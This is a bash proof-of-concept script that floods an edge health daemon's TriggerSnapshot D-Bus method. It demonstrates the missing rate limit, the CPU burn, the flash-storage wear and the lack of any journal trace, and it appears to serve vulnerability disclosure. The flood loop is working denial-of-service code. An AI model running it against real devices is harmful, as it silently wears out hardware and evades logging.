#!/usr/bin/env bash
# trigger-flood.sh — proves TriggerSnapshot has no rate-limit
#
# Hammers TriggerSnapshot in a tight loop and measures how many collection
# cycles actually ran, demonstrating unbounded wakeup and silent flash wear.
#
# Usage (run on target):
#   bash scripts/trigger-flood.sh [iterations]
#
# Key evidence:
#   1. cycle counter  — every call triggers a real collection cycle
#   2. /proc/<pid>/io — write syscalls accumulate (flash wear)
#   3. journalctl     — flood is completely invisible (5-min rate-limited log)

set -euo pipefail

ITERATIONS=${1:-30}
SNAPSHOT=/run/health/state.json
BUSCTL_METHOD="edge.health /edge/health/manager edge.health.Manager TriggerSnapshot"

# ── Prereqs ───────────────────────────────────────────────────────────────────
if ! busctl status edge.health &>/dev/null; then
    echo "ERROR: edge.health D-Bus service not reachable" >&2; exit 1
fi
if ! command -v jq &>/dev/null; then
    echo "ERROR: jq required" >&2; exit 1
fi

PID=$(pgrep -x edge-healthd)

proc_val() { grep "^$1:" /proc/"$PID"/io | awk '{print $2}'; }

# ── Baseline ──────────────────────────────────────────────────────────────────
cycle_before=$(jq -r '.cycle // 0' "$SNAPSHOT")
syscw_before=$(proc_val syscw)

echo "════════════════════════════════════════"
echo "  TriggerSnapshot flood — ${ITERATIONS} calls"
echo "════════════════════════════════════════"
echo "Daemon PID     : $PID"
echo "Baseline cycle : $cycle_before"
echo "Baseline syscw : $syscw_before"
echo ""
echo "Flooding..."

# ── Flood ─────────────────────────────────────────────────────────────────────
t_start=$(date +%s%3N)
for i in $(seq 1 "$ITERATIONS"); do
    busctl call $BUSCTL_METHOD > /dev/null
done
t_end=$(date +%s%3N)
elapsed_ms=$(( t_end - t_start ))

sleep 0.5   # let last cycle finish

cycle_after=$(jq -r '.cycle // 0' "$SNAPSHOT")
syscw_after=$(proc_val syscw)

cycles_delta=$(( cycle_after  - cycle_before ))
syscw_delta=$(( syscw_after  - syscw_before ))

# ── Results ───────────────────────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo "  Evidence 1: cycle counter"
echo "════════════════════════════════════════"
printf "Elapsed : %d.%03ds\n" "$(( elapsed_ms / 1000 ))" "$(( elapsed_ms % 1000 ))"
echo "Calls   : ${ITERATIONS}"
echo "Cycles  : +${cycles_delta}  (${cycle_before} → ${cycle_after})"
if (( cycles_delta == ITERATIONS )); then
    echo "         every call triggered a full collection cycle"
fi

echo ""
echo "════════════════════════════════════════"
echo "  Evidence 2: flash write syscalls"
echo "════════════════════════════════════════"
echo "syscw delta : +${syscw_delta} write syscalls in ${elapsed_ms}ms"
if (( elapsed_ms > 0 )); then
    # writes/min = delta * 60000 / elapsed_ms
    wpm=$(( syscw_delta * 60000 / elapsed_ms ))
    echo "Projected   : ~${wpm} write syscalls/min  (normal: ~2/min)"
fi

echo ""
echo "════════════════════════════════════════"
echo "  Evidence 3: journalctl (last 5 lines)"
echo "════════════════════════════════════════"
journalctl _PID="$PID" --no-pager -n 5
echo ""
echo "  ^ flood produced zero log lines — all ${cycles_delta} cycles are invisible"
echo "    (snapshot_collected is rate-limited to once per 5 minutes)"

echo ""
echo "════════════════════════════════════════"
echo "  Verdict"
echo "════════════════════════════════════════"
if (( cycles_delta > 1 )); then
    rate_x1000=$(( cycles_delta * 1000000 / elapsed_ms ))
    echo "Effective rate : $(( rate_x1000 / 1000 )).$(( rate_x1000 % 1000 )) cycles/s"
    echo "Normal rate    : 0.017 cycles/s  (1 per 60s)"
    echo ""
    echo "No rate-limit on TriggerSnapshot. Any unprivileged local D-Bus client"
    echo "can drive the daemon at full collection speed, causing:"
    echo "  - continuous CPU burn (12ms cycles back-to-back)"
    echo "  - ~${wpm} snapshot writes/min to flash  (normal: 1/min)"
    echo "  - completely silent — no journal evidence"
else
    echo "Only ${cycles_delta} cycle(s) ran — rate-limit appears to be in effect."
fi
